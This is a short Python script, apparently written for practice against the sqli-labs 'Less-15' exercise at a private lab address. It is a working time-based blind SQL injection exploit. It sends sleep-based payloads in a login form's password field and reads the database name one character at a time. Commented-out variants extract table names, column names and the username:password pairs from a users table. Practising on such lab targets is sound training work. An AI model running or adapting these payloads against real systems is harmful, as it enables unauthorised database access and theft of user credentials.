import requests
import time

url="http://192.168.68.130/sqli/Less-15/"
header={
    "Content-Type": "application/x-www-form-urlencoded"
}

response = requests.get(url)

if response.status_code != 200:
    print(response.status_code)
    exit()
#print(response.text)

values=""
for i in range(1,10):
    for j in range(33,127):
        find="database()"  #数据库
        #find="(select group_concat(table_name) from information_schema.tables where table_schema=database())"  #表
        #find="(select group_concat(column_name) from information_schema.columns where table_name='users' and table_schema=database())" #列
        #find="(select group_concat(username,':',password) from users)"  #值
        #时间盲注 判断时间
        start=time.time()
        payload={
            "passwd": "1' or if(substring({},{},1)='{}',sleep(2),sleep(0)) -- ".format(find,i,chr(j)),
            #"passwd": "1' or if(substring({},{},1)='{}',sleep(2),sleep(0)) #".format(find,i,chr(j)),
            "submit": "Submit",
            "uname": "1"                                      
        }
        response = requests.post(url,headers=header,data=payload)
        end=time.time()
        if end-start>=1.5:  #给一点误差空间
            values+=chr(j)
            print(values)   
            break
print(values)
